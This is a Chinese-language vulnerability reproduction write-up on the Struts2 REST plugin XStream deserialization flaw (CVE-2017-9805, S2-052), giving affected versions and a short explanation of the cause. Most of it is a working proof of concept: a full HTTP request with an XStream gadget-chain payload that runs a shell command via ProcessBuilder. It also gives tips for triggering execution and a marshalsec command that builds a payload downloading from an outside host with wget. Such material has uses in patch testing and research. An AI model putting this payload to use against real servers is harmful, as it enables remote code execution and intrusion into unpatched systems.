<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2017-9805）s2-052</h1><h2>一、漏洞简介</h2><p>Struts2-Rest-Plugin是让Struts2能够实现Restful API的一个插件，其根据Content-Type或URI扩展名来判断用户传入的数据包类型，有如下映射表：</p><table border="1"><tr><td><span class="pydocx-left">扩展名</span></td><td><span class="pydocx-left">Content-Type</span></td><td><span class="pydocx-left">解析方法</span></td></tr><tr><td><span class="pydocx-left">xml</span></td><td><span class="pydocx-left">application/xml</span></td><td><span class="pydocx-left">xstream</span></td></tr><tr><td><span class="pydocx-left">json</span></td><td><span class="pydocx-left">application/json</span></td><td><span class="pydocx-left">jsonlib或jackson(可选)</span></td></tr><tr><td><span class="pydocx-left">xhtml</span></td><td><span class="pydocx-left">application/xhtml+xml</span></td><td><span class="pydocx-left">无</span></td></tr><tr><td><span class="pydocx-left">无</span></td><td><span class="pydocx-left">application/x-www-form-urlencoded</span></td><td><span class="pydocx-left">无</span></td></tr><tr><td><span class="pydocx-left">无</span></td><td><span class="pydocx-left">multipart/form-data</span></td><td><span class="pydocx-left">无</span></td></tr></table><p>jsonlib无法引入任意对象，而xstream在默认情况下是可以引入任意对象的（针对1.5.x以前的版本），方法就是直接通过xml的tag name指定需要实例化的类名：</p><p>&lt;classname&gt;&lt;/classname&gt;<br />//或者<br />&lt;paramname class="classname"&gt;&lt;/paramname&gt;</p><p>所以，我们可以通过反序列化引入任意类造成远程命令执行漏洞，只需要找到一个在Struts2库中适用的gedgetType。</p><p>总得来说，用了Struts2-Rest-Plugin插件，这个插件是根据Content-Type或者扩展名来选择解析方法，xstream在默认情况下是可以引入任意对象的，所以他在处理xml的时候会发生RCE（xstream处理xml数据时，未对数据做任何过滤，在反序列化将xml数据转换成object时导致的RCE）。利用起来就是改Content-Type或扩展名 .xml application/xml 发恶意xml</p><h2>二、漏洞影响</h2><p>Struts 2.1.2 - Struts 2.3.33</p><p>Struts 2.5 - Struts 2.5.12</p><h2>三、复现过程</h2><h2>POC</h2><p><strong>没回显 Response 500 但命令执行</strong></p><p>POST /orders/3 HTTP/1.1<br />Host: 10.17.14.18:8081<br />Content-Length: 1655<br />Cache-Control: max-age=0<br />Origin: http://www.0-sec.org:8081<br />Upgrade-Insecure-Requests: 1<br />Content-Type: application/xml<br />User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8<br />Referer: http://10.17.14.18:8081/orders/3/edit<br />Accept-Encoding: gzip, deflate<br />Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,und;q=0.7<br />Cookie: JSESSIONID=249144A9BEB141072470A76C2A61D663<br />Connection: close<br /><br />&lt;map&gt; <br />&lt;entry&gt; <br />&lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"&gt; &lt;dataHandler&gt; &lt;dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"&gt; &lt;is class="javax.crypto.CipherInputStream"&gt; &lt;cipher class="javax.crypto.NullCipher"&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class="javax.imageio.spi.FilterIterator"&gt; &lt;iter class="javax.imageio.spi.FilterIterator"&gt; &lt;iter class="java.util.Collections$EmptyIterator"/&gt; &lt;next class="java.lang.ProcessBuilder"&gt; &lt;command&gt;&lt;string&gt;/usr/bin/touch&lt;/string&gt;&lt;string&gt;/tmp/vuln&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class="javax.imageio.ImageIO$ContainsFilter"&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class="string"&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class="java.lang.ProcessBuilder$NullInputStream"/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/&gt; <br />&lt;/entry&gt; <br />&lt;/map&gt;</p><p>访问ip：port 直接到/orders 你可以直接change method 然后加上body 改Content-type 为xml Response status code 500 执行成功了（不要怀疑 我也怀疑 后来看了一下文件 是真的）</p><p>也可以编辑之后保存 会有一个POST /orders/5 或者其他数字 有body的 改掉body 改Content-type 为xml 也可以执行</p><p>编辑完之后还会有一个/orders.xhtml?statusCode=303 change method 删掉body 改Content-type 为xml 文件名就不用改了 不然404了</p><p>payload生成<br />下载 https://github.com/ianxtianxt/marshalsec<br />mvn clean package -DskipTests<br />java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream ImageIO wget www.0-sec.org -O /tmp/1.html &gt;1.txt<br />注：针对XStream支持很多种Payload，找一个Struts2也支持的即可,需要找到Struts2库中适用的gedget（事实上我找了，都试了，只有ImageIO好使，文章的都是骗人了，哭了）</p></body></html>